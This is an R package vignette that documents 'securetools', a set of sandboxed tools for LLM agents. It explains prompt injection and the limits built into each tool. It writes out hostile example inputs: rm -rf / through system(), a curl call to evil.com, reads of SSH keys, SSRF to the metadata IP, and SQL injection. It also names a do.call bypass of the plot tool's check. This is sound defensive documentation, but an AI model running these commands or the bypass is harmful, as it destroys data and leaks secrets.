---
title: "Getting started with securetools"
output: rmarkdown::html_vignette
vignette: >
  %\VignetteIndexEntry{Getting started with securetools}
  %\VignetteEngine{knitr::rmarkdown}
  %\VignetteEncoding{UTF-8}
---

```{r, include = FALSE}
knitr::opts_chunk$set(
  collapse = TRUE,
  comment = "#>",
  eval = FALSE
)
```

## Why tools need limits

A tool you give an LLM agent is code the model can run whenever it decides
to. If the model can call `system()`, it can run any shell command. If it
can write files anywhere, it can overwrite something you care about. If it
can send raw SQL, it can drop a table or read every row.

The model doesn't have to be badly behaved for this to go wrong. Prompt
injection works by hiding instructions in data the agent reads: a CSV it
was asked to summarize, a web page it fetched, a column name in a query
result. Agents often follow those instructions. If the tools have no
limits, one successful injection is enough to do real damage.

securetools has ready-made tools for
[securer](https://github.com/ian-flores/securer) with the limits built in.
The file tools can't reach outside the folders you list. The SQL tool takes
a table, columns, and a filter, and writes the query itself. The URL tool
only talks to the domains you allow.

Each `tool_*()` function returns a `securer::securer_tool()` object, which
you pass to a `SecureSession`.

## How a tool call runs

Validation happens in your main R session (the parent process), not in
the sandbox.

```
  LLM Agent                 Parent Process (R)              Sandbox (securer)
  =========                 ==================              =================
      |                            |                               |
      |--- tool_call(args) ------->|                               |
      |                            |                               |
      |                     1. Validate args:                      |
      |                        - Check rate limit                  |
      |                        - Resolve symlinks                  |
      |                        - Match allow-lists                 |
      |                        - Verify size limits                |
      |                            |                               |
      |                     2. Reject? -----> Error to LLM         |
      |                            |                               |
      |                     3. Pass validated -------> Execute     |
      |                        call to sandbox         in sandbox  |
      |                            |                               |
      |                            |<------------- Result ---------|
      |                            |                               |
      |<--- result/error ----------|                               |
```

When code in the sandbox calls a tool, securer sends the call to the
parent. The parent checks the arguments and, if they pass, runs the tool's
function and sends the result back. Because both the checks and the tool
itself run in the parent, code in the sandbox can't change or skip them.

## Installation

```{r install}
# install.packages("pak")
pak::pak("ian-flores/securetools")
```

## The tools

```{r setup}
library(securetools)
library(securer)
```

### Calculator

If you hand a model a calculator that just evaluates R, nothing stops it
from sending `calculator(expression = "system('rm -rf /')")`.

`tool_calculator()` parses the expression and walks the parse tree before
running anything. Every function and name has to be on a short list of
arithmetic and math functions. Variables, assignment, and any other
function call are rejected, and nothing is evaluated.

```{r calculator}
calc <- tool_calculator()
session <- SecureSession$new(tools = list(calc))

session$execute('calculator(expression = "sqrt(144) + 2^3")')
#> [1] 20

# Rejected: system() isn't on the list
session$execute('calculator(expression = "system(\'whoami\')")')
#> Error: Function not allowed in calculator: `system()`

session$close()
```

### Reading and writing files

An agent that can read any file can read `~/.ssh/id_rsa` or a `.env` file.
One that can write anywhere can fill the disk or replace files outside the
project. Paths like `../../` and symlinks are the usual ways out of a
folder.

`tool_read_file()` and `tool_write_file()` take a list of allowed folders.
Paths are resolved, symlinks included, before they're compared with that
list. Both tools have a size limit, and the writer won't overwrite an
existing file unless you set `overwrite = TRUE`. Reading and writing are
set up separately, so you can let an agent read from one folder and write
only to another.

```{r file-io}
# Only allow access to a specific directory
data_dir <- "/path/to/project/data"

reader <- tool_read_file(
  allowed_dirs = data_dir,
  max_file_size = "50MB",
  max_rows = 10000
)

writer <- tool_write_file(
  allowed_dirs = data_dir,
  max_file_size = "10MB",
  overwrite = FALSE
)

session <- SecureSession$new(tools = list(reader, writer))

# Read a CSV (auto-detects format from extension)
session$execute('
  data <- read_file(path = "/path/to/project/data/input.csv", format = "auto")
  head(data)
')

# Write results (path traversal is blocked)
session$execute('
  result <- data.frame(x = 1:5, y = letters[1:5])
  write_file(
    path = "/path/to/project/data/output.csv",
    content = result,
    format = "csv"
  )
')

session$close()
```

### SQL queries

If an agent can send raw SQL, a prompt injection can get it to run
`DROP TABLE`, a `UNION SELECT` that pulls data from other tables, or an
`UPDATE`. Parameterized queries help, but only when every query uses them
correctly.

`tool_query_sql()` doesn't take SQL at all. The agent names a table, the
columns it wants, and an optional filter, and the tool builds the query.
The filter value is sent as a query parameter, never pasted into the SQL:

```
  Agent Request                           Tool Internals
  =============                           ==============
  table = "users"             --->   SELECT name, email
  columns = "name, email"           FROM users
  filter_column = "active"          WHERE active = ?
  filter_value = "1"                 [bound: "1"]
```

The table has to be in `allowed_tables`. Column names aren't checked
against a list, but they must be plain identifiers (letters, digits, and
underscores), and table and column names are quoted with
`DBI::dbQuoteIdentifier()`. Results are capped at `max_rows`.

```{r sql}
library(DBI)
con <- dbConnect(RSQLite::SQLite(), "app.db")

sql_tool <- tool_query_sql(

  conn = con,
  allowed_tables = c("users", "orders"),
  max_rows = 1000
)

session <- SecureSession$new(tools = list(sql_tool))

# Query with filter (uses parameterized query internally)
session$execute('
  query_sql(
    table = "users",
    columns = "name, email",
    filter_column = "active",
    filter_value = "1"
  )
')

session$close()
dbDisconnect(con)
```

### Fetching URLs

With open network access, an agent can reach services that aren't meant to
be public, like a cloud metadata endpoint at `http://169.254.169.254` or an
internal API on `http://localhost:8080`. This is server-side request
forgery (SSRF). It can also send data out to a server an attacker controls,
or hit an API in a loop.

`tool_fetch_url()` only allows GET and HEAD over HTTP or HTTPS. The host
must match `allowed_domains`, where `*.example.com` matches any subdomain
of `example.com` but not `example.com` itself. The tool looks up the host's
IP address once, refuses private and loopback addresses (and all IPv6
addresses), and then connects to that address so a second DNS answer can't
send it somewhere else. It doesn't follow redirects, and it caps the
response size and the number of calls per minute.

HTTPS requests currently fail. Connecting by IP address breaks the TLS
certificate check, so the example below errors until that is fixed. Plain
HTTP works.

```{r fetch}
fetcher <- tool_fetch_url(
  allowed_domains = c("api.github.com", "*.githubusercontent.com"),
  max_response_size = "1MB",
  timeout_secs = 30,
  max_calls_per_minute = 10
)

session <- SecureSession$new(tools = list(fetcher))

session$execute('
  result <- fetch_url(url = "https://api.github.com/zen", method = "GET")
  result$body
')

session$close()
```

### Profiling data

Summarizing a very large data frame can use a lot of memory.
`tool_data_profile()` profiles a random sample of `max_rows` rows when the
data is bigger than that, and says in its result that it sampled.

```{r profile}
profiler <- tool_data_profile(max_rows = 100000)
session <- SecureSession$new(tools = list(profiler))

session$execute('
  profile <- data_profile(data = iris)
  profile$columns[[1]]  # Sepal.Length stats
')

session$close()
```

### Plots

Plotting code is still R code. `plot(x); system("curl evil.com")` looks
like a plot but also runs a shell command.

`tool_plot()` parses the code first and rejects any function that isn't on
its list of graphics, math, and data functions. That check is weaker than
it sounds; see the known limitations below. The plot is written to a
temporary file, checked against `max_file_size`, and then copied to a path
inside `allowed_dirs`.

At the moment only `plot()` itself works. The code runs with only the base
package visible, so functions from graphics such as `hist()`, `lines()`,
and `barplot()` aren't found, and the example below fails until that is
fixed.

```{r plot}
plotter <- tool_plot(
  allowed_dirs = "/path/to/output",
  max_file_size = "5MB"
)

session <- SecureSession$new(tools = list(plotter))

session$execute('
  plot(
    path = "/path/to/output/chart.png",
    plot_code = "hist(rnorm(1000), main = \"Distribution\")",
    width = 8,
    height = 6,
    format = "auto"
  )
')

session$close()
```

### R help

Looking up help pages seems harmless, but it tells the agent which
packages you have installed. `tool_r_help()` only returns pages from the
packages in `allowed_packages`, and cuts each page off at `max_lines`
lines.

```{r r-help}
help_tool <- tool_r_help(allowed_packages = c("base", "stats", "utils"))

session <- SecureSession$new(tools = list(help_tool))

# Look up documentation for a function
result <- session$execute('r_help(topic = "mean", package = "base")')
cat(result)

session$close()
```

## What the tools protect against

The checks run in the parent process. Here is what each one is for:

- Reading secret files: paths are resolved, symlinks included, and must
  be inside an allowed folder.
- Writing to the wrong place: write paths are checked the same way, and
  checked again after the file is written.
- Running arbitrary code: the calculator and plot tools reject functions
  that aren't on their lists (the plot tool has a known gap, below).
- Reaching internal services: the URL tool only allows HTTP and HTTPS,
  allowed domains, and public IP addresses.
- SQL injection: the agent never writes SQL, and filter values are
  passed as parameters.
- Runaway use: every tool has an optional call limit, and the file,
  plot, and URL tools have size limits.

### Known limitations

- Between checking a path and writing to it, someone with access to the
  folder could swap in a symlink. The write and plot tools check the path
  again after writing and delete the file if it ended up outside the
  allowed folders, but the write has already happened by then.
- Call limits live in memory. They reset when the R process restarts. If
  you need limits that last, enforce them outside R.
- The plot tool is not safe for untrusted code yet. Its allow list
  includes `do.call()`, and the code runs with base R visible, so
  `do.call("system", list("ls"))` gets past the check and runs. Until this
  is fixed, only use `tool_plot()` inside a sandboxed session.
- `tool_fetch_url()` can't fetch HTTPS URLs yet (see above).
- Passing a data frame the size of `iris` or `mtcars` to `data_profile()`
  from inside a `SecureSession` currently fails while the data is sent
  between processes. Small data frames work, and calling the tool directly
  with `profiler@fn(iris)` works.

### Calling tools through a SecureSession

Inside a `SecureSession`, the tool functions don't keep the default
argument values from the factory. Pass every argument, even ones with a
default like `format = "auto"`.

## Call limits

An agent loop keeps calling tools until the model decides it's done or
runs out of tokens. A confused or manipulated agent can make thousands of
calls. A call limit stops it no matter what the model decides.

Every tool takes `max_calls`, a limit on the total number of calls.
`tool_fetch_url()` also takes `max_calls_per_minute`. When a limit is
reached, the tool raises an error, and the agent can see that error and
change course.

```{r rate-limit}
# Allow only 100 calculator evaluations per session
calc <- tool_calculator(max_calls = 100)

# URL fetch with both lifetime and per-minute limits
fetcher <- tool_fetch_url(
  allowed_domains = "api.github.com",
  max_calls = 1000,
  max_calls_per_minute = 10
)
```

## All tools

| Function | Limits |
|---|---|
| `tool_calculator()` | Allowed functions only; rejects anything else before evaluating |
| `tool_data_profile()` | Samples rows from large data |
| `tool_read_file()` | Allowed folders, size cap, row cap |
| `tool_write_file()` | Allowed folders, size cap, no overwriting by default |
| `tool_query_sql()` | Allowed tables, no raw SQL, parameterized filters |
| `tool_fetch_url()` | Allowed domains, no private IPs, size cap, calls per minute |
| `tool_plot()` | Allowed functions, allowed folders, size cap |
| `tool_r_help()` | Allowed packages, line cap |
